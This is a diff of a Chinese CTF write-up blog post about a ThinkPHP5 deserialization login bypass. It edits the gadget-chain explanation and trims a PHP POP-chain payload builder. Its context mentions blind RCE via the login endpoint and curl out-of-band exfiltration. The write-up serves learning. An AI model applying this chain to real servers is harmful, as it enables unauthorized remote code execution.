@@ -479,7 +479,7 @@ cc<span class="token punctuation">.</span>__proto__<span class="token punctuatio
 <p><img src="/blog/2024/03/23/NKCTF2024/image-20240325194941567.png" alt="image-20240325194941567"></p>
 <hr>
 <h2 id="用过就是熟悉-复现"><a href="#用过就是熟悉-复现" class="headerlink" title="用过就是熟悉 (复现)"></a>用过就是熟悉 (复现)</h2><blockquote>
-<p>tp反序列化绕过登录</p>
+<p>tp5反序列化绕过登录</p>
 </blockquote>
 <p>本地起个环境先</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -498,9 +498,9 @@ cc<span class="token punctuation">.</span>__proto__<span class="token punctuatio
 <p><img src="/blog/2024/03/23/NKCTF2024/image-20240325213436815.png" alt="image-20240325213436815"></p>
 <p>然后一路跟到<code>toArray</code></p>
 <p><img src="/blog/2024/03/23/NKCTF2024/image-20240325213652215.png" alt="image-20240325213652215"></p>
-<p>明显这里的<code>$items</code>可以触发<code>__get</code>，全局搜一下，选择 app&#x2F;controller&#x2F;user&#x2F;think&#x2F;View.php 下的<code>__get</code></p>
+<p>明显这里的<code>$this-&gt;items-&gt;Loginout</code>可以触发<code>__get</code>，全局搜一下，选择 app&#x2F;controller&#x2F;user&#x2F;think&#x2F;View.php 下的<code>__get</code></p>
 <p><img src="/blog/2024/03/23/NKCTF2024/image-20240325213920733.png" alt="image-20240325213920733"></p>
-<p>这里执行函数，发现<code>Loginsubmit</code>找不到定义，那么可以触发<code>__call</code></p>
+<p>这里执行函数，发现<code>Loginsubmit</code>找不到定义，此时<code>data[$name]</code>为<code>data[Loginout]</code>，那么控制<code>engine</code>的值，可以触发<code>__call</code></p>
 <p>全局找一下，发现 app&#x2F;controller&#x2F;user&#x2F;think&#x2F;Testone.php 下有hint</p>
 <p><img src="/blog/2024/03/23/NKCTF2024/image-20240325214339579.png" alt="image-20240325214339579"></p>
 <p>hinthinthinthinthinthinthint.php</p>
@@ -758,18 +758,6 @@ name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bph
 <span class="token punctuation">&#125;</span>
 
 <span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Testone</span>
-    <span class="token punctuation">&#123;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Debug</span> <span class="token keyword">extends</span> <span class="token class-name">Testone</span>
-    <span class="token punctuation">&#123;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Config</span>
     <span class="token punctuation">&#123;</span>
     <span class="token punctuation">&#125;</span>
@@ -783,7 +771,7 @@ name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bph
     <span class="token variable">$Collection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>Collection</span><span class="token punctuation">(</span><span class="token variable">$View</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$Windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$Collection</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在<code>/?user/index/loginSubmit</code>发包</p>
 <p>无回显rce，题目环境没有 bash 和 nc，尝试curl带外</p>
